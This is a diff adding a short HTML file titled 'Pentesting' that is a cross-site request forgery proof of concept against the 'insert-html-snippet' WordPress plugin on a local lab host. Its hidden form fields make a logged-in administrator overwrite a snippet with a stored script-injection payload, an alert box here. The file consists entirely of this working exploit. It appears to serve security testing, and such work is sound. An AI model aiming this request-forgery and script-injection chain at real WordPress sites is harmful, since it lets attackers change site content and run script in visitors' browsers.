@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Pentesting</title>
+    <head>
+    <body>
+        <form action="http://wpdistillery.vm/wp-admin/admin.php?page=insert-html-snippet-manage&action=snippet-edit&snippetId=1&pageno=1" method="POST">
+            <input type="hidden" name="snippetId" value="1" />
+            <input type="hidden" name="snippetTitle" value="Fu" />
+            <input type="hidden" name="snippetContent" value="<script>alert(1);</script>" />
+            <input type="hidden" name="updateSubmit" value="Update" />
+            <input type="submit" value="Submit request" />
+        </form>
+    </body>
+</html>
